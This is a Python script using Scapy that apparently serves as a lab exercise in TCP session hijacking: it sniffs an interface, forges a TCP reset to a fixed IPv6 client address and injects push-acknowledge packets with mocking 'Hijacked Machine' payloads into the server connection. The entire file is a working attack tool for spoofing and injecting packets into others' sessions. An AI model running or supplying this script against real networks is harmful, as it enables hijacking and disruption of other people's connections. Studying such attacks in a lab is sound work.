#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.l2 import Ether

# The script sniffs the channel on ens34 and looks for TCP Sync-ACK packet and TCP pcaket with PA flag,
# then crafts new TCP pcket with "A" flag and forwards it accordingly, in order to hijack the TCP session.

# function to process the packet
def process_packet(packet):
    # Check if the packet is a TCP packet with "A" flag heading from Client to Server
    if TCP in packet and packet[IPv6].src == "2001:db8:0:1::2" and packet[TCP].flags == 'A':
        # Create the Ethernet layer
        mac_src = packet[Ether].dst
        mac_dst = packet[Ether].src
        eth = Ether(dst=mac_dst, src=mac_src)
        # Craft the IPv4 layer
        ipv4_src = packet[IP].dst
        ipv4_dst = packet[IP].src
        ipv4 = IP(src=ipv4_src, dst=ipv4_dst, flags='DF')
        # Create the IPv6 layer
        ipv6_src = packet[IPv6].dst
        ipv6_dst = packet[IPv6].src
        ipv6 = IPv6(version=6, src=ipv6_src, dst=ipv6_dst)
        # Create the TCP layer
        new_seq = packet[TCP].ack
        src_port = packet[TCP].dport
        dst_port = packet[TCP].sport
        # Create the TCP layer with the RST flag set
        tcp = TCP(sport=src_port, dport=dst_port, seq=new_seq, window=0, flags='R')
        # Create the packet by stacking the layers
        pkt = eth / ipv6 / ipv4 / tcp
        
        # Prepare the "PA" Packet 
        mac_src2 = packet[Ether].src
        mac_dst2 = packet[Ether].dst
        eth2 = Ether(dst=mac_dst2, src=mac_src2)
        # Craft the IPv4 layer
        ipv4_src2 = packet[IP].src
        ipv4_dst2 = packet[IP].dst
        ipv42 = IP(src=ipv4_src2, dst=ipv4_dst2, flags='DF')
        # Create the IPv6 layer
        ipv6_src2 = packet[IPv6].src
        ipv6_dst2 = packet[IPv6].dst
        ipv62 = IPv6(version=6, src=ipv6_src2, dst=ipv6_dst2)
        # Create the TCP layer
        new_seq2 = packet[TCP].ack
        src_port2 = packet[TCP].sport
        dst_port2 = packet[TCP].dport
        # Create the TCP layer with the RST flag set
        tcp2 = TCP(sport=src_port2, dport=dst_port2, seq=new_seq2, window=0, flags='PA')
        # Create the payload
        data2 = "I am the new Hijacked Machine :)"
        # Create the packet by stacking the layers
        pkt2 = eth2 / ipv62 / ipv42 / tcp2 / data2
      
        # Now we send the two prepared packets 
        # Send the TCP Reset Packet
        sendp(pkt, iface='ens34')
        print(f"I just sent TCP RESET Packet the the Client")
       
        # Send the PA Packet
        sendp(pkt2, iface='ens34')
        print(f"I just sent TCP Packet with PA flags to the Server")


    # Check if the packet is a TCP packet with "A" flag heading from Server to Client
    elif TCP in packet and packet[IPv6].dst == "2001:db8:0:1::2" and packet[TCP].flags == 'A':
        print(f"Found TCP packet with A flag from Server to Client")
        # Create the Ethernet layer
        mac_src = packet[Ether].dst
        mac_dst = packet[Ether].src
        eth = Ether(dst=mac_dst, src=mac_src)
        # Craft the IPv4 layer
        ipv4_src = packet[IP].dst
        ipv4_dst = packet[IP].src
        ipv4 = IP(src=ipv4_src, dst=ipv4_dst, flags='DF')
        # Create the IPv6 layer
        ipv6_src = packet[IPv6].dst
        ipv6_dst = packet[IPv6].src
        ipv6 = IPv6(version=6, src=ipv6_src, dst=ipv6_dst)
        # Create the TCP layer
        new_seq = packet[TCP].ack
        src_port = packet[TCP].dport
        dst_port = packet[TCP].sport
        # Create the TCP layer with the RST flag set
        tcp = TCP(sport=src_port, dport=dst_port, seq=new_seq, window=0, flags='PA')
        # Create the payload
        data3 = "Again I am the new Hijacked Machine again :)"
        # Create the packet by stacking the layers
        pkt = eth / ipv6 / ipv4 / tcp / data3
        # Send the TCP PA Packet
        sendp(pkt, iface='ens34')
        print(f"I just sent TCP Packet the the Server with PA flag again")
        
sniff(iface='ens34', prn=process_packet)

